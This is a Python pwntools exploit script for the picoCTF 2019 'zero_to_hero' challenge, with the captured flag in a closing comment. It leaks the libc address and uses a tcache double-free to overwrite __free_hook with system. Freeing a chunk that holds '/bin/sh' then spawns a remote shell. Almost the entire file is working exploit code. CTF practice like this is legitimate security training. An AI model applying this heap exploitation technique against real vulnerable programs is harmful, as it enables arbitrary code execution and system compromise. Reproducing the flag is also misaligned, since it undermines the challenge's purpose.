from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./zero_to_hero')
	raw_input('debug')
else:
	host, port= '2019shell1.picoctf.com', 45180
	r = remote(host, port)

libc = ELF('./libc.so.6')
free_hook_offset = libc.symbols['__free_hook']
system_offset = libc.symbols['system']

def get_power(size, desc):
	r.sendlineafter('> ', '1')
	r.sendlineafter('> ', str(size))
	r.sendafter('> ', desc)

def remove_power(ind):
	r.sendlineafter('> ', '2')
	r.sendlineafter('> ', str(ind))

r.sendlineafter('So, you want to be a hero?', 'yes')
r.recvuntil('Take this: ')
res = r.recv(14)
system_add = int(res,16)
libc_base = system_add - system_offset
log.info('libc_base = %#x' %libc_base)
log.info('system addr = %#x' %system_add)
free_hook_add = libc_base + free_hook_offset

get_power(0xf8, 'linh')
get_power(0x110, 'abcd')
remove_power(0)
remove_power(1)

buf = '/bin/sh\x00'
buf = buf.ljust(0xf8, 'a') 
get_power(0xf8, buf) #2
remove_power(1)
get_power(0x110, 'abcd')
remove_power(3)

get_power(0xf8, p64(free_hook_add))
get_power(0xf8, 'a'*0xf8)
get_power(0xf8, p64(system_add))
remove_power(2)

r.interactive()
r.close()
# picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_pramlxuc}